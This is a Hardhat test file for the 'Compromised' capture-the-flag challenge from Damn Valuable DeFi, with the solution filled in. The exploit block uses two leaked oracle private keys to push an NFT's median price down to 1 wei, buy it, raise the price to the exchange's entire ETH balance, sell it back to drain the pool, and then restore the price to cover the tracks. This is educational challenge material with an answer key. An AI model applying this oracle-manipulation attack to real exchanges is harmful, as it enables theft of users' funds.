const { expect } = require('chai');
const { ethers } = require('hardhat');

describe('Compromised challenge', function () {

    const sources = [
        '0xA73209FB1a42495120166736362A1DfA9F95A105',
        '0xe92401A4d3af5E446d93D11EEc806b1462b39D15', // 0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9
        '0x81A5D6E50C214044bE44cA0CB057fe119097850c' // 0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48
    ];

    let deployer, attacker;
    const EXCHANGE_INITIAL_ETH_BALANCE = ethers.utils.parseEther('9990');
    const INITIAL_NFT_PRICE = ethers.utils.parseEther('999');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const ExchangeFactory = await ethers.getContractFactory('Exchange', deployer);
        const DamnValuableNFTFactory = await ethers.getContractFactory('DamnValuableNFT', deployer);
        const TrustfulOracleFactory = await ethers.getContractFactory('TrustfulOracle', deployer);
        const TrustfulOracleInitializerFactory = await ethers.getContractFactory('TrustfulOracleInitializer', deployer);

        // Initialize balance of the trusted source addresses
        for (let i = 0; i < sources.length; i++) {
            await ethers.provider.send("hardhat_setBalance", [
                sources[i],
                "0x1bc16d674ec80000", // 2 ETH
            ]);
            expect(
                await ethers.provider.getBalance(sources[i])
            ).to.equal(ethers.utils.parseEther('2'));
        }

        // Attacker starts with 0.1 ETH in balance
        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x16345785d8a0000", // 0.1 ETH
        ]);
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.equal(ethers.utils.parseEther('0.1'));

        // Deploy the oracle and setup the trusted sources with initial prices
        this.oracle = await TrustfulOracleFactory.attach(
            await (await TrustfulOracleInitializerFactory.deploy(
                sources,
                ["DVNFT", "DVNFT", "DVNFT"],
                [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE]
            )).oracle()
        );

        // Deploy the exchange and get the associated ERC721 token
        this.exchange = await ExchangeFactory.deploy(
            this.oracle.address,
            { value: EXCHANGE_INITIAL_ETH_BALANCE }
        );
        this.nftToken = await DamnValuableNFTFactory.attach(await this.exchange.token());
    });

    it('Exploit', async function () {        
        /** CODE YOUR EXPLOIT HERE */
        
        // these accounts are compromised; maybe I can set the price lower?
        // const sources = [
        //     '0xA73209FB1a42495120166736362A1DfA9F95A105',
        //     '0xe92401A4d3af5E446d93D11EEc806b1462b39D15', // 0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9
        //     '0x81A5D6E50C214044bE44cA0CB057fe119097850c' // 0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48
        // ];

        // connect via the attacker account
        this.oracle = this.oracle.connect(attacker);
        this.exchange = this.exchange.connect(attacker);
        this.nftToken = this.nftToken.connect(attacker);

        const signerOne = new ethers.Wallet("0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9", ethers.provider);
        const signerTwo = new ethers.Wallet("0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48", ethers.provider);

        // update the prices to a really low one, buy all tokens, then update them back such that we get all the money from the pool.
        
        // get the median price based on the oracles
        var currentPriceInWei = await this.oracle.getMedianPrice(this.nftToken.symbol());
        console.log("Initial price in Wei of nft token "  + parseInt(currentPriceInWei["_hex"], 16));

        // get all prices for nft token
        var allPricesInWei = await this.oracle.getAllPricesForSymbol(this.nftToken.symbol());
        console.log("All prices of nft tokens(in wei) "  + allPricesInWei);
        
        // using first signer
        await this.oracle.connect(signerOne).postPrice(this.nftToken.symbol(), 1);
        // using second signer
        await this.oracle.connect(signerTwo).postPrice(this.nftToken.symbol(), 1);

        // get the median price based on the oracles
        currentPriceInWei = await this.oracle.getMedianPrice(this.nftToken.symbol());
        console.log("Updated price in Wei of nft token "  + parseInt(currentPriceInWei["_hex"], 16));

        // get all prices for nft token
        allPricesInWei = await this.oracle.getAllPricesForSymbol(this.nftToken.symbol());
        console.log("All prices of nft tokens(in wei) "  + allPricesInWei);

        // attacker balance before transaction
        console.log(await ethers.provider.getBalance(attacker.address));
        await this.exchange.buyOne({value: 1});

        await this.oracle.connect(signerOne).postPrice(this.nftToken.symbol(), await ethers.provider.getBalance(this.exchange.address)); // +  1 required since we give it 1 via buyOne
        await this.oracle.connect(signerTwo).postPrice(this.nftToken.symbol(), await ethers.provider.getBalance(this.exchange.address));

        // get all prices for nft token
        allPricesInWei = await this.oracle.getAllPricesForSymbol(this.nftToken.symbol());
        
        for(let i = 0; i < allPricesInWei.length; i++) {
            console.log(parseInt(allPricesInWei[i]["_hex"], 16));
        }

        // get the median price based on the oracles
        currentPriceInWei = await this.oracle.getMedianPrice(this.nftToken.symbol());
        console.log("Current selling price " + parseInt(currentPriceInWei["_hex"], 16));

        await this.nftToken.approve(this.exchange.address, 0);
        await this.exchange.sellOne(0);

        // get the balance of the exchange after the transaction;
        console.log("Balance of the exchange " + await ethers.provider.getBalance(this.exchange.address));

        await this.oracle.connect(signerOne).postPrice(this.nftToken.symbol(), INITIAL_NFT_PRICE); 
        await this.oracle.connect(signerTwo).postPrice(this.nftToken.symbol(), INITIAL_NFT_PRICE);

    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        
        // Exchange must have lost all ETH
        expect(
            await ethers.provider.getBalance(this.exchange.address)
        ).to.be.eq('0');
        
        // Attacker's ETH balance must have significantly increased
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.be.gt(EXCHANGE_INITIAL_ETH_BALANCE);
        
        // Attacker must not own any NFT
        expect(
            await this.nftToken.balanceOf(attacker.address)
        ).to.be.eq('0');

        // NFT price shouldn't have changed
        expect(
            await this.oracle.getMedianPrice("DVNFT")
        ).to.eq(INITIAL_NFT_PRICE);
    });
});
